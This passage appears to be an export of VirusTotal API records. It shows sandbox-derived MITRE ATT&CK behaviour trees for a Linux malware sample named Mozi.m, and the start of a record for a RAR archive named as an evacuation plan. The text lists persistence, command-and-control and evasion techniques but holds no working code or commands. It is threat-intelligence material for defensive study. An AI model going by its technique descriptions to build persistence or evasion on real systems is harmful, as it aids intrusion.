        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 44,
        "undetected": 16
      },
      "meaningful_name": "Mozi.m",
      "reputation": -234,
      "first_seen_itw_date": 1623973106
    },
    "type": "file",
    "id": "e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0"
    }
  },
  "mitre": {
    "data": {
      "Zenbox Linux": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample persists itself using System V runlevels"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample persists itself using System V runlevels"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"sed\" command used to modify input streams (typically from files or pipes)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads CPU information from /sys indicative of miner or evasive malware"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads system information from the proc file system"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"uname\" command used to read OS and architecture name"
                  },
                  {
                    "severity": "INFO",
                    "description": "Reads CPU information from /proc indicative of miner or evasive malware"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample reads /proc/mounts (often used for finding a writable filesystem)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses the \"uname\" system call to query kernel version information (possible evasion)"
                  },
                  {
                    "severity": "INFO",
                    "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"iptables\" command used for managing IP filtering and manipulation"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Posts data to webserver"
                  },
                  {
                    "severity": "INFO",
                    "description": "Tries to download or post to a non-existing http route (HTTP/1.1 404 Not Found / 503 Service Unavailable)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "LOW",
                    "description": "Found C&C like URL pattern"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads compressed data via HTTP"
                  },
                  {
                    "severity": "LOW",
                    "description": "Passes username and password via HTTP get"
                  },
                  {
                    "severity": "INFO",
                    "description": "Executes the \"wget\" command typically used for HTTP/S downloading"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Posts data to webserver"
                  },
                  {
                    "severity": "INFO",
                    "description": "Tries to download or post to a non-existing http route (HTTP/1.1 404 Not Found / 503 Service Unavailable)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads compressed data via HTTP"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              },
              {
                "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts.\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Some HTTP requests failed (404). It is likely the sample will exhibit less behavior"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads files from webservers via HTTP"
                  },
                  {
                    "severity": "INFO",
                    "description": "Tries to download or post to a non-existing http route (HTTP/1.1 404 Not Found / 503 Service Unavailable)"
                  },
                  {
                    "severity": "INFO",
                    "description": "Downloads compressed data via HTTP"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1105/",
                "id": "T1105",
                "name": "Ingress Tool Transfer"
              },
              {
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Uses HTTPS"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1573/",
                "id": "T1573",
                "name": "Encrypted Channel"
              },
              {
                "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Detected TCP or UDP traffic on non-standard ports"
                  },
                  {
                    "severity": "LOW",
                    "description": "Uses network protocols on non-standard ports"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1571/",
                "id": "T1571",
                "name": "Non-Standard Port"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Deletes log files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/",
                "id": "T1070",
                "name": "Indicator Removal"
              },
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes commands using a shell command-line interpreter"
                  },
                  {
                    "severity": "INFO",
                    "description": "Writes shell script files to disk"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"rm\" command used to delete files or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Drops files in suspicious directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample is packed with UPX"
                  },
                  {
                    "severity": "INFO",
                    "description": "ELF contains segments with high entropy indicating compressed/encrypted content"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              },
              {
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates hidden files, links and/or directories"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              },
              {
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Sample tries to set the executable flag"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1222/",
                "id": "T1222",
                "name": "File and Directory Permissions Modification"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.\nAn adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.\nAdversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample persists itself using System V runlevels"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1053/001/",
                "id": "T1053.001",
                "name": "At (Linux)"
              },
              {
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Sample tries to persist itself using /etc/profile"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1546/004/",
                "id": "T1546.004",
                "name": "Unix Shell Configuration Modification"
              },
              {
                "description": "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \nSystemd utilizes unit configuration files with the .service file extension to encode information about a service's process. By default, system level unit files are stored in the /systemd/system directory of the root owned directories (/). User level unit files are stored in the /systemd/user directories of the user owned directories ($HOME). \nInside the .service unit files, the following directives are used to execute commands:  \n\nExecStart, ExecStartPre, and ExecStartPost directives execute when a service is started manually by systemctl or on system start if the service is set to automatically start.\nExecReload directive executes when a service restarts. \nExecStop, ExecStopPre, and ExecStopPost directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a .service file’s directive executes, and modified the user directive a .service file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Executes the \"systemctl\" command used for controlling the systemd system and service manager"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/002/",
                "id": "T1543.002",
                "name": "Systemd Service"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e15e93db3ce3a8a22adb4b18e0e37b93f39c495e4a97008f9b1a9a42e1fac2b0/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f6d3247565d4a4ddef11"
  },
  "data": {
    "attributes": {
      "type_description": "RAR",
      "tlsh": "T129273396111AF7844B3F186412E446E3E98ED332A56281F4E7D93BE1B136C7D3B1A738",
      "type_tags": [
        "compressed",
        "rar"
      ],
      "names": [
        "Електронний план евакуації.rar"
      ],
      "last_modification_date": 1706343464,
      "type_tag": "rar",
      "times_submitted": 4,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 20789854,
      "type_extension": "rar",
      "last_submission_date": 1705990125,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
